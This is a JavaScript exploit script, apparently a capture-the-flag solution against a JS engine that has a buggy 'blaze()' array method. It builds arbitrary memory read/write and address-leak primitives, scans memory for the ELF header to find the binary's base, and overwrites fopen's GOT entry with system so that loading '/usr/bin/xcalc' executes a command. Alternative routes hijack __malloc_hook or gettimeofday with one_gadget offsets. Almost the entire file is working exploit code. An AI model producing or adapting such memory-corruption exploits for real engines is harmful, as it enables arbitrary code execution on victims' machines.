load('./utils.js');
load('./int64.js');
load('./mypwn.js');

function arb_r(addr) {
	var x, y;
        x = new Array(1.1, 2.2, 3.3, 4.4, 5.5, 6.6);
        y = new Uint8Array(8);
	x.blaze();
        i = new Int64(addr);
        save = x[13];
        x[13] = i.asDouble();
        value = y[0];
        x[13] = save;
        return value;
}

function arb_rstring(addr) {
	str = "";

	while (1) {
		ch = arb_r(addr);
		if (ch == 0)
			return str;
//		console.log(String.fromCharCode(ch));
		str += String.fromCharCode(ch);
		addr += Number(1);
	}
}

function arb_r2(addr) {
	a = Number(addr);
	v0 = BigInt(arb_r(a + 0));
	v1 = BigInt(arb_r(a + 1));
	pointer = v0 + (v1 << 8n);
	return Number(pointer);
}


function arb_r4(addr) {
	a = Number(addr);
	v0 = BigInt(arb_r(a + 0));
	v1 = BigInt(arb_r(a + 1));
	v2 = BigInt(arb_r(a + 2));
	v3 = BigInt(arb_r(a + 3));
	pointer = v0 + (v1 << 8n) + (v2 << 16n) + (v3 << 24n);
	return Number(pointer);
}

function arb_r8(addr) {
	a = Number(addr);
	v0 = BigInt(arb_r(a + 0));
	v1 = BigInt(arb_r(a + 1));
	v2 = BigInt(arb_r(a + 2));
	v3 = BigInt(arb_r(a + 3));
	v4 = BigInt(arb_r(a + 4));
	v5 = BigInt(arb_r(a + 5));
	pointer = v0 + (v1 << 8n) + (v2 << 16n) + (v3 << 24n) + (v4 << 32n) + (v5 << 40n);
	return Number(pointer);
}

function addr_of(obj) {
	myx = new Array(1.1, 2.2, 3.3, 4.4, 5.5, 6.6);
	myy = new Array(obj);
	myx.blaze();
	return Number(arb_r8(Int64.fromDouble(myx[9])));
}

function arb_w(addr, value) {
	x = new Array(1.1, 2.2, 3.3, 4.4, 5.5, 6.6);
	y = new Uint8Array(8);
	x.blaze();
	i = new Int64(addr);
	save = x[13];
	x[13] = i.asDouble();
	y[0] = value;
	x[13] = save;
}

function arb_w8(addr, value) {
	var i;

	for (i = 0; i < 8; i ++) {
		v = value & BigInt(0xff);
		arb_w(Number(addr), Number(v));
		value >>= BigInt(8);
		addr += BigInt(1);
	}
}

function leak_heap() {
	//var heap_base = BigInt(Int64.fromDouble(x.heap_base()));
	var target = new Uint8Array(16);
	var elementsPtr = arb_r8(BigInt(addr_of(target)) + BigInt(8*3));
	var heap_base = BigInt(elementsPtr) + BigInt(0x4c2390);
	return heap_base;
}

function leak_libc() {
	return BigInt(Int64.fromDouble(x.libc_base()));
}

function do_system(got) {
	/*
	var heap_base = leak_heap();
	var system_got = heap_base + BigInt(0x128);
	var fopen_got = heap_base + BigInt(0x040);
	*/
	system_got = BigInt(got["system"]);
	fopen_got = BigInt(got["fopen"]);

	var system_libc = BigInt(arb_r8(system_got));

	console.log("got fopen " + fopen_got.toString(16));
	console.log("got system " + system_got.toString(16));
	fopen_backup = arb_r8(fopen_got);
	arb_w8(fopen_got, system_libc);
	load("/usr/bin/xcalc");
	arb_w8(fopen_got, fopen_backup);
}

function get_one_gadget() {
	var libc_base = leak_libc();
	var which_one_gadget = 4;

	if (which_one_gadget == 1) {
		return libc_base + BigInt(0x106ef8);
	} else if (which_one_gadget == 2) {
		return libc_base + BigInt(0xe2386);
	} else if (which_one_gadget == 3) {
		return libc_base + BigInt(0xe237f);
	} else if (which_one_gadget == 4) {
		return one_gadget = libc_base + BigInt(0xe2383);
	}
}

function do_malloc_hook() {
	var heap_base = leak_heap();
	var __malloc_hook = heap_base + BigInt(0x6c8);
	arb_w8(__malloc_hook, get_one_gadget());
	x.free();
}

function do_got() {
	var heap_base = leak_heap();
	var gettimeofday_got = heap_base + BigInt(0x4d8);
	arb_w8(gettimeofday_got, get_one_gadget());
	Date.now();
}

function leak_text() {
        var target = new Uint8Array(16);
        var elementsPtr = arb_r8(BigInt(addr_of(target)) + BigInt(8*3));
        elementsPtr = elementsPtr - (elementsPtr % 4096);
        while (1) {
		x = new Array(1.1, 2.2, 3.3, 4.4, 5.5, 6.6);
		y = new Uint8Array(8);
		x.blaze();

		addr = elementsPtr;

		i = new Int64(addr);
		x[13] = i.asDouble();
		value1 = y[0];
		addr += Number(1);
		
		if (value1 != 0x7f) {
                	elementsPtr -= 4096;
			continue;
		}

		i = new Int64(addr);
		x[13] = i.asDouble();
		value2 = y[0];
		addr += Number(1);

		if (value2 != 0x45) {
                	elementsPtr -= 4096;
			continue;
		}

		i = new Int64(addr);
		x[13] = i.asDouble();
		value3 = y[0];
		addr += Number(1);

		if (value3 != 0x4c) {
                	elementsPtr -= 4096;
			continue;
		}

		i = new Int64(addr);
		x[13] = i.asDouble();
		value4 = y[0];
		addr += Number(1);
	
		if (value4 != 0x46) {
                	elementsPtr -= 4096;
			continue;
		}

                return elementsPtr;
	}
}

var got;
do {
	base_addr = leak_text();
	console.log("base address is " + base_addr.toString(16));
	got = get_got(base_addr);
} while (typeof got["system"] === 'undefined');
do_system(got);
